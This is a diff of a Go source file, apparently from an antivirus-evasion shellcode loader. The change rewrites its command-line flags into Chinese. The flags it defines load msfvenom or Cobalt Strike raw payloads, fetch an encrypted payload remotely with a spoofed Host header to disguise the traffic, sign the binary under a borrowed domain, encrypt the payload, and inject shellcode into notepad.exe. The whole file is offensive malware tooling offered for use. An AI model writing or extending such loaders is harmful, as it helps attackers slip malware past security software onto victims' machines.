@@ -9,9 +9,7 @@ import (
 )
 
 var (
-	antiAV = config{
-		loader: "normal",
-	}
+	antiAV = config{}
 )
 
 func main() {
@@ -20,13 +18,17 @@ func main() {
 }
 
 func initialize() {
-	flag.StringVar(&antiAV.loader, "l", "sc", "loader: binary")
-	flag.StringVar(&antiAV.shellcode, "sc", "payload.e", "encrypt payload by anti-av: support 'msfvenom -f raw' OR 'cs raw' OR remote url loading")
 	flag.StringVar(&antiAV.os, "os", "windows", "OS: windows,linux")
-	flag.StringVar(&antiAV.domain, "domain", "baidu.com", "domain to be signed")
-	flag.StringVar(&antiAV.hostObfuscator, "ho", "wwww.baidu.com", "host obfuscator")
-	flag.BoolVar(&antiAV.crypt, "e", false, "payload to be encrypted")
-	flag.BoolVar(&antiAV.inject, "inject", false, "inject payload to notepad.exe")
+	flag.StringVar(&antiAV.loader, "l", "sc", "支持的加载类型: sc")
+	flag.StringVar(&antiAV.paylaod, "p", "payload.bin", `Payload: 
+	1.支持 远程远程加载payload.e(参考payload.e生成实例)
+	2.支持MSF payload generate by '-f raw'.
+	3.支持CS raw payload.
+	`)
+	flag.StringVar(&antiAV.domain, "domain", "baidu.com", "代码签名,需填写实际存在的域名")
+	flag.StringVar(&antiAV.hostObfuscator, "ho", "wwww.baidu.com", "远程加载payload.e时,在GET请求头中替换host实现流量混淆")
+	flag.BoolVar(&antiAV.crypt, "e", false, `生成payload.e`)
+	flag.BoolVar(&antiAV.inject, "inject", false, "开启注入模式, shellcode注入到Notepad.exe")
 	flag.Parse()
 
 	if err := antiAV.validate(); err != nil {
